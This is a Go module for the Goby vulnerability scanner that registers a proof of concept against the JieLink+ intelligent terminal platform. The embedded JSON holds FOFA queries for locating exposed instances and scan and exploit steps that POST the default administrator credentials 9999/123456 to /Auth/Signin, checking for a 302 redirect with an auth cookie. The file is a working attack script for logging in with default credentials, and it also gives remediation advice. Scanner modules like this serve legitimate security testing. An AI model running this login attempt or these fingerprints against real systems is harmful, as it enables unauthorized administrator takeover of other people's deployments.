package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "JieLink Default password vulnerability",
    "Description": "<p>Jielink+is an intelligent terminal operating platform. There is a default password for this platform. An attacker can control the entire platform through the default password (9999/123456) and operate core functions with administrator privileges.</p>",
    "Product": "Jielink-+-Intelligent-TOP",
    "Homepage": "https://www.jieshun.cn/",
    "DisclosureDate": "2022-03-31",
    "Author": "13eczou",
    "FofaQuery": "banner=\"Set-Cookie: DefaultSystem=JieLink\" || header=\"Set-Cookie: DefaultSystem=JieLink\" || title=\"JieLink+智能终端操作平台\"",
    "GobyQuery": "banner=\"Set-Cookie: DefaultSystem=JieLink\" || header=\"Set-Cookie: DefaultSystem=JieLink\" || title=\"JieLink+智能终端操作平台\"",
    "Level": "1",
    "Impact": "<p>attackers can control the entire platform through the default password(9999/123456) vulnerability, and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://fofa.info/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/Auth/Signin",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "{{{fixedhostinfo}}}"
                },
                "data_type": "text",
                "data": "returnUrl={{{fixedhostinfo}}}%2Fhome%2Fmain&username=9999&password=123456"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "JSST.AUTH",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "home/main",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Object moved",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/Auth/Signin",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "{{{fixedhostinfo}}}"
                },
                "data_type": "text",
                "data": "returnUrl={{{fixedhostinfo}}}%2Fhome%2Fmain&username=9999&password=123456"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "JSST.AUTH",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "home/main",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Object moved",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastheader|text|(9999:123456)"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "JieLink+智能终端操作平台 默认口令漏洞",
            "Product": "JieLink+智能终端操作平台",
            "Description": "<p>jielink+是一款智能终端操作平台</span>。该平台存在默认口令，攻击者可通过默认口令（9999/123456）控制整个平台，使用管理员权限操作核心功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令（9999/123456）漏洞控制整个平台，使用管理员权限操作核心的功能。<br><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "JieLink Default password vulnerability",
            "Product": "Jielink-+-Intelligent-TOP",
            "Description": "<p>Jielink+is an intelligent terminal operating platform. There is a default password for this platform. An attacker can control the entire platform through the default password (9999/123456) and operate core functions with administrator privileges.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>attackers can control the entire platform through the default password(9999/123456) vulnerability, and use administrator privileges to operate core functions.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}